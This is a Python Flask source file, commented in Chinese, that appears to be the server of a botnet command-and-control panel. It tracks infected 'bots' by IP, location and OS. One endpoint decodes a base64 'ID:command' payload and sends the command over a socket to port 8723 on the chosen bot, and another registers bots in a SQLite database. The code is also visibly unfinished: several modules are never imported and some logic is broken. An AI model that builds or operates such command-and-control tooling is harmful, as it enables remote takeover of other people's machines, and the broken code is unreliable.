import subprocess

from flask import Flask, render_template, jsonify, request
from flask_login import LoginManager, login_required, current_user
from datetime import datetime, timedelta
import random


app = Flask(__name__)

cmd = []

bots = [ # 测试数据
    {
        "id": 1,
        "ip": "192.168.1.101",
        "status": "online",
        "geo": "Beijing, CN",
        "last_online": datetime.now() - timedelta(minutes=random.randint(0, 5)),
        "os": "Windows 10",
        "cpu_usage": random.randint(10, 90),
        "memory_usage": random.randint(20, 80)
    },

]


@app.route('/api/bots')
def get_bots():
    # 更新设备状态（模拟实时更新）
    for bot in bots:
        if (datetime.now() - bot["last_online"]).seconds > 300:  # 5分钟未更新视为离线
            bot["status"] = "offline"
    return jsonify({"bots": bots})

@app.route('/bots')
def bot_dashboard():
    return render_template('cc.html')

@app.route('/bots/cmd')
def bot_cmd():
    return render_template('cmd.html')
@app.route('/bots/execute' ,methods=['GET', 'POST'])
def bot_execute():
    data = request.json
    command = data['command']
    if not data or 'command' not in data:
        return jsonify({'error': '未提供命令'}), 400
    try:
        # 解码 Base64 请求体
        encoded_data = request.get_data(as_text=True)
        decoded_data = base64.b64decode(encoded_data).decode('utf-8')

        # 解析 ID 和命令（格式：ID:命令）
        if ':' not in decoded_data:
            return "Invalid format", 400
        checkid, command = decoded_data.split(':', 1)

        # 通过 ID 查找 IP
        ip = checkbotid(checkid)
        if not ip:
            return base64.b64encode("设备不存在".encode('utf-8')).decode('utf-8')

        # Socket 通信
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cmd:
            cmd.settimeout(10)
            cmd.connect((ip, 8723))
            cmd.send(command.encode('utf-8'))
            # 接收响应
            output = cmd.recv(1024)
            if not output:
                output = base64.b64encode(f"No information".encode('utf-8')).decode('utf-8')
                return output
            return output, 200

    except Exception as e:
        return jsonify({'error': f'执行命令时出错: {str(e)}'}), 500


def checkbotid(checkid):
    for bot in bots:
        if bot["id"] == int(checkid):
            return bot["ip"]
    return None

@app.route('/api/getbot', methods=['GET', 'POST']) # 还没测试
def bot_checkbot():
    db_file = "db/bots.db"
    db_dir = os.path.dirname(db_file)

    # 确保数据库目录存在
    if not os.path.exists(db_dir):
        os.makedirs(db_dir)
    need_init = not os.path.exists(db_file)
    db_conn = sqlite3.connect(db_file)
    cursor = db_conn.cursor()

    if need_init:
        create_table_sql = '''
                CREATE TABLE bots (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT NOT NULL,
                    status TEXT CHECK(status IN ('online', 'offline')),
                    geo TEXT DEFAULT 'Unknown',
                    last_online DATETIME DEFAULT CURRENT_TIMESTAMP,
                    os TEXT,
                    cpu_usage REAL ,
                    memory_usage REAL 
                );
                '''
        cursor.execute(create_table_sql)
        db_conn.commit()
        return jsonify({'success': True, 'message': '数据库及表结构初始化完成'})
    if request.method == 'POST':
        data = {
            "ip": request.form.get('ip'),
            "status": request.form.get('status'),
            "geo": request.form.get('geo'),
            "os": request.form.get('os'),
            "cpu_usage": float(request.form.get('cpu_usage')),
            "memory_usage": float(request.form.get('memory_usage'))
        }

        insert_sql = '''
        INSERT INTO bots (ip, status, geo, os, cpu_usage, memory_usage)
        VALUES (?, ?, ?, ?, ?, ?)
        '''
        cursor.execute(insert_sql, data)
        db_conn.commit()
    return jsonify({'success': True, 'message': '无需再次初始化'})


if __name__ == '__main__':
    app.run()
